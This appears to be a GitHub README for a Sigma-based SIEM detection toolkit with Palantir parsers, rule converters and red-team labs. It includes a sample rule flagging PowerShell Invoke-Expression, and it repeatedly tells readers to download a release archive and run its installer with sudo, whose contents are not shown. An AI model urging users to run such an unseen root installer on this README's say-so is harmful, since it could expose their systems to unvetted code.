# Palantir Threat Detection: Open SIEM Labs with Sigma Rules

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/reynol1305/Palantir-Threat-Detection/releases)

A focused toolkit for SIEM teams. It bundles Sigma rules, parsers, and lab playbooks that target data from Palantir, Elastic, Splunk, Wazuh, and other platforms. Use it for threat hunting, detection engineering, and red team validation.

![SIEM Dashboard](https://images.unsplash.com/photo-1531431244053-2f45b7eacb2d?w=1200&q=80)
(Image: generic security dashboard)

## Key features

- Sigma rules set tuned for Palantir and common log sources.
- Cross-platform rule conversion (Sigma -> Elastic/Splunk/Wazuh).
- Attack playbooks and detection tests for red team validation.
- Parsers and ingestion templates for Palantir logs.
- Modular labs for DFIR, threat hunting, and threat intelligence workflows.
- CI-friendly tests and rule linting.

## Badges and quick links

[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)](LICENSE)  
[![Open Issues](https://img.shields.io/github/issues/reynol1305/Palantir-Threat-Detection?style=for-the-badge)](https://github.com/reynol1305/Palantir-Threat-Detection/issues)

Releases: https://github.com/reynol1305/Palantir-Threat-Detection/releases  
Download the release package from the Releases page and run the installer script included in the asset.

## Repository scope

This repo targets defenders and engineers who work with Palantir and SIEM stacks. It mixes practical rules and labs with conversion tools and docs.

Relevant topics: atlas-nexus, bda-analytik, cybersecurity, dfir, elastic-security, minerva, osint, palantir, polis, redteam, redteaming, security, siem, sigma-rules, splunk, threat-detection, threat-hunting, threat-intelligence, vs-datarium, wazuh

## Quick start

1. Visit the Releases page and download the latest asset:
   https://github.com/reynol1305/Palantir-Threat-Detection/releases

2. Extract and run the installer (example for Linux):
```bash
# fetch the release asset filename from the Releases page
wget https://github.com/reynol1305/Palantir-Threat-Detection/releases/download/v1.0.0/palantir-threat-detection-v1.0.0.tar.gz
tar xzf palantir-threat-detection-v1.0.0.tar.gz
cd palantir-threat-detection-v1.0.0
sudo bash ./install.sh
```

3. Configure connectors for your SIEM (examples in /docs/connectors).

The release asset includes:
- sigma/           # Sigma rule sources
- converters/      # Sigma conversion tools (python)
- playbooks/       # Attack scenarios and lab steps
- docs/            # Setup and mapping guides
- install.sh       # Installer that deploys templates and parsers

Use the Releases page to get the correct asset and version. Open the release package and run the included script to apply templates and rules.

## Sigma rules and conversions

This repo uses Sigma as the central rule format. You get:
- Authorable Sigma rules in yaml.
- A conversion pipeline to Elastic queries, Splunk SPL, and Wazuh rules.
- Rule metadata for detection mapping and MITRE ATT&CK tags.

Convert a Sigma rule to Elastic:
```bash
python3 converters/sigma2elastic.py sigma/rules/windows/suspicious_process.yml \
  --output elastic/rules
```

Convert to Splunk:
```bash
python3 converters/sigma2splunk.py sigma/rules/linux/ssh_bruteforce.yml \
  --output splunk/rules
```

Each converter adds a header with the original Sigma metadata and the mapped ATT&CK IDs.

## Palantir integration patterns

Palantir logs vary by deployment. This repo provides:
- Templates for parsing Palantir audit logs.
- Field mappings to common SIEM schemas.
- Example queries for hunts in Palantir-derived logs.

Place the Palantir templates in your ingestion pipeline. The installer adds example mapping files to /etc/palantir-mappings or to the SIEM template path you choose.

## Use cases and labs

The repo contains modular labs that walk you through realistic scenarios. Each lab includes:
- Objectives and success criteria.
- Synthetic data and generators.
- Sigma rules to detect the simulated activity.
- Validation checks and mitigation steps.

Sample lab topics:
- Initial access via compromised credentials.
- Lateral movement and remote execution.
- Data staging and exfiltration via unusual channels.
- Detection bypass and red team validation.

Run a lab:
```bash
cd playbooks/labs/credential-compromise
./run_lab.sh --target elastic
```
The lab will ingest sample events and run the detection tests. Use the included reporter to check which Sigma rules fired.

## Testing and CI

We include simple tests for rule syntax and conversion validity.

Local lint:
```bash
python3 tools/sigma_lint.py sigma/
```

Run conversion tests:
```bash
pytest tests/test_conversions.py
```

Add the test suite to your CI pipeline to prevent broken rule conversions and syntax errors.

## Rule development workflow

1. Create or update a Sigma rule in sigma/rules/.
2. Add metadata: title, id, status, author, tags, references.
3. Run the linter.
4. Convert to target SIEM.
5. Test with synthetic or replayed logs.
6. Submit a PR with rule justification and test evidence.

Keep rules small and focused. Use clear titles. Map to ATT&CK where applicable.

## Examples

Example Sigma rule snippet (simplified):
```yaml
title: Suspicious powershell command
id: 7d9f1a2b-xxxx-xxxx-xxxx-xxxxxxxx
status: experimental
logsource:
  product: windows
detection:
  selection:
    CommandLine|contains: "Invoke-Expression"
  condition: selection
fields:
  - CommandLine
tags:
  - attack.execution
```

Converted Elastic query sample (auto-generated):
```json
{
  "query": {
    "bool": {
      "must": [
        { "match_phrase": { "process.command_line": "Invoke-Expression" } }
      ]
    }
  }
}
```

## Integrations

- Elastic Security: mapping templates, detection queries, dashboards.
- Splunk: apps, macro-driven searches, and saved searches.
- Wazuh: rule conversion and active response hooks.
- Palantir: ingestion templates and audit parsers.
- Minerva/Atlas: lab playbooks and data connectors.

## How to validate detections

1. Deploy a rule in a test index.
2. Replay or inject synthetic events.
3. Monitor alerts and check rule context fields.
4. Tune the rule to reduce false positives.
5. Add whitelists and data enrichment where needed.

We include example scripts to generate synthetic events in ./tools/data_gen/.

## Releases and downloads

Get the latest release here: https://github.com/reynol1305/Palantir-Threat-Detection/releases

Download the asset and run the included installer. The release page contains packaged rules, conversion binaries, and the installer script. Example:
```bash
# after downloading the release asset to /tmp
tar xzf /tmp/palantir-threat-detection-v1.0.0.tar.gz -C /opt/
cd /opt/palantir-threat-detection
sudo ./install.sh
```

If the release link changes or you cannot access it, check this repository's Releases section on GitHub for the latest assets.

## Contribution guide

We accept pull requests for:
- New Sigma rules.
- Rule tuning and tests.
- Better parsers or template mappings.
- Bug fixes in conversion tools.

Steps:
1. Fork the repo.
2. Create a branch for your change.
3. Add tests for rule or tool changes.
4. Open a PR with a clear description and test results.

Keep commits focused. Use clear commit messages. Add metadata and references to ATT&CK where possible.

## Governance and quality

- Rules include status flags: experimental, stable, deprecated.
- Maintain a changelog in CHANGELOG.md.
- Use the tests in /tests to validate conversions and execution.

## Roadmap

Planned items:
- More Palantir-specific rule packs.
- Enriched playbooks for hybrid-cloud environments.
- Better mapping templates for newer Elastic schemas.
- Automated test harness for rule impact analysis.

## FAQs

Q: Can I use these rules in production?
A: Test rules in a staging environment. Tune them before wide deployment.

Q: Do you support automatic updates?
A: Use CI to pull rules from the repo and deploy them to your manager tool.

Q: How do I add a new conversion target?
A: Add a converter module under converters/ and follow the existing converter pattern. Include tests.

## Contact and acknowledgements

- Maintainer: Security engineering team members and community contributors.
- Acknowledge upstream tools: Sigma project, Elastic, Splunk, Wazuh.

## License

This repository uses the MIT license. See LICENSE for details.

<img src="https://img.icons8.com/ios-filled/50/000000/security-checked.png" alt="security" width="40" />